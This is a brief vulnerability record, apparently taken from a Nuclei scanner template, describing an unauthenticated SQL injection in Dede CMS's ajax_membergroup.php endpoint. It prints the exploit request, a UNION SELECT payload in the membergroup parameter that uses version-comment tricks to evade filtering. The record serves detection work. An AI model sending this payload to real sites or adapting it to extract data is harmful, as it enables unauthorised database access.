# Vulnerability: Dede CMS - SQL Injection
**Classification:** CWE-89
**Source:** Nuclei Template (`dedecms-membergroup-sqli.yaml`)

## Description
Dede CMS contains a SQL injection vulnerability which allows remote unauthenticated users to inject arbitrary SQL statements via the ajax_membergroup.php endpoint and the membergroup parameter.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/member/ajax_membergroup.php?action=post&membergroup=@`'`/*!50000Union+*/+/*!50000select+*/+md5({{num}})+--+@`'`
```

